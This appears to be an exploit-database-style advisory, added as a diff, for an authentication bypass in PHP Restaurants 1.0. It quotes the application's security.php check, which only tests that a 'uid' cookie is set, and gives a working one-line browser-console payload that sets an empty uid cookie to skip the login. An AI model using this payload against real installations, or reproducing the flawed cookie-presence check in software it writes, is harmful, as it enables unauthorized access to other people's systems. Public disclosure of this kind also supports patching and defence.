@@ -1,0 +1,20 @@
+# Exploit Title: PHP Restaurants 1.0 - Authentication Bypass [ Cookie ]
+# Google Dork: None
+# Date: 4/26/2023
+# Exploit Author: Or4nG.M4n
+# Vendor Homepage: https://github.com/jcwebhole
+# Software Link: https://github.com/jcwebhole/php_restaurants
+# Version: 1.0
+
+
+# security.php
+
+ if(!isset($_COOKIE['uid']) && basename($_SERVER['PHP_SELF']) != 'login.php' && basename($_SERVER['PHP_SELF']) != 'register.php'){
+	header('location: login.php?m=You need to login');
+ }
+
+ $_COOKIE['uid'] check if the cookie name uid is set go to main page if not return to login page with error login.php?m=You need to login
+
+ in browser console set this javascript code 
+ document.cookie = "uid=";
+ refresh page and you will be in ..
